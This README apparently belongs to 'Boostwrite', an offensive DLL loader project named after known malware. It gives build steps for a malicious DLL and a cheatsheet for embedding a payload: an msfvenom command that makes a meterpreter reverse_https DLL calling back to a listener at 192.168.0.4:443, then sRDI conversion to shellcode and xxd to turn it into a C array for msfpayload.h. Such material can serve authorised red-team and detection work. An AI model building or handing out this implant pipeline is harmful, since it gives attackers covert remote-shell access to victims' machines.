## Boostwrite - Getting Dependencies
* Note, you must have libcurl and zlib locally as a dependency to compile boostwrite.
* Recommend using vcpkg, steps listed below.

1. Get latest vcpkg zip file from https://github.com/microsoft/vcpkg/releases (package available [here](https://github.com/microsoft/vcpkg/archive/2019.09.zip) and extract it to a folder of your choice (e.g. C:\vcpkg\)

2. Open Developer Command Prompt for VS 2017 (see Windows Start menu or %PROGRAMDATA%\Microsoft\Windows\StartMenu\Programs\Visual Studio 2017\Visual Studio Tools\) and cd to C:\vcpkg\
3. Run bootstrap-vcpkg.bat
4. Run vcpkg.exe integrate install
5. Run vcpkg.exe install curl

##  Build Instructions - Visual Studio

1. Create new visual studio DLL C++ project.
2. Substitute template dllmain.cpp for dllmain.cpp in this project.
3. Add the header files into the project.
4. Update msfpayload.h with your payload.



## MSFPayload Build Cheatsheet for BOOSTWRITE
0. Generate MSF payload
```
msfvenom - p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f dll -o msf.dll
```

1. Leverage SRDI to create PIC code.

```
from ShellcodeRDI import *

dll = open("TestDLL_x86.dll", 'rb').read()
shellcode = ConvertToShellcode(dll)
print(shellcode)
# optional, write to a new DLL and use xxd to create C array 
```

2. Create C array of sRDI DLL or just copy the bytes produced by the previous example
```
xxd -i msf.exe
```

3. Copy and paste in msfpayload.h

4. Update variable names as appropriate.

### References
* [Stackoverflow Install Help for libcurl and Visual Studio](https://stackoverflow.com/questions/53861300/how-do-you-properly-install-libcurl-for-use-in-visual-studio-2017)

* [sRDI](https://github.com/monoxgas/sRDI)